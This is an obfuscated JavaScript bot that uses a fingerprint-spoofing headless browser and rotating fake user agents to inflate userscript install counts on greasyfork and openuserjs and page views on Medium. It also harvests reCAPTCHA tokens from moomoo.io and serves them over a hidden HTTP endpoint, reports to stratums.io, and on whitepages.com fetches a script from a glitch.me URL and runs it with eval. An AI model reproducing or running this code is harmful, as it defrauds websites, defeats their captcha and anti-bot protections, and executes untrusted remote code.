      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + Y(0x2, 'p4f*'),
    'Mozilla/5.' + '0\x20(Linux;\x20' + Z(0x12) + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + Y(0x7, '8)It') + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => 0x1d6d + -0x2556 + 0x7e9
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](0x7f3 + 0xd37 + -0x102 * 0x15)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, 0x1613 * 0x1 + -0x6d4 + 0x1 * -0xedb), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, 0x83b + -0x33d * -0xc + -0x2eb3), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = -0x163d + -0x11 * -0x87 + 0xd46;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = -0x159a + -0x3e3 * -0x3 + 0x9f1; w < getRandomInt(-0x448 * 0x4 + 0x1 * -0xc47 + 0x1d68, 0x1 * 0x60d + 0x60e + -0xc16); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(-0x21 * 0x3a9 + -0x2cf * 0x78 + -0x1 * -0x2b431);
        }
      }();
    }, 0x65c + -0xe2 * -0x1c + -0x2 * 0xf58), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = -0xd3 * 0x1f + 0x3 * -0x335 + 0x1196 * 0x2;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](-0x35 * -0xc + 0xc2 * 0x24 + 0x3 * -0x9ec, 0x1 * 0xce9 + 0xdf9 + 0x3d0 * -0x7)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0x1 * -0xcedf + 0x14b5 + 0x12f5a);
    }, -0x1532 + 0xb73 + 0xa23), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = -0xbe0 * -0x2 + -0x11cb + -0x5f5;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(0x1f4e + -0x2f * 0x5f + -0x225), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', -0x18ce + 0xf21 + -0x9ad * -0x1), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(-0x1b5b7d + -0xed583 * 0x1 + 0x37eca0);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, -0x30 * -0x60 + 0x1dd4 + -0x2f70);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const a0 = b,
      i = url['parse'](f['url'])[a0(0xe, 't*[1')];
    h['writeHead'](0xff1 + 0xb * -0x293 + 0xd28);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || -0xa6 * -0x40 + 0x382c + -0x421c);
}
doFlags['doOUJS'] && ((async () => {
  async function f() {
    const k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = 0xc89 * -0x2 + -0x1bb3 * -0x1 + -0x2a0) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (-0x24d4 + -0x42d * 0x3 + 0x315c));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](-0x5 * 0x606 + -0x2 * -0x97 + 0x2 * 0xe78, D['indexOf']('\x20'));
        return B ? E['slice'](-0x1138 + -0xa22 * -0x3 + -0xd2e, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](0x2601 + -0x139f + 0x2 * 0xa57),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](-0x22cb + 0xda7 * 0x3 + 0x20e6),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
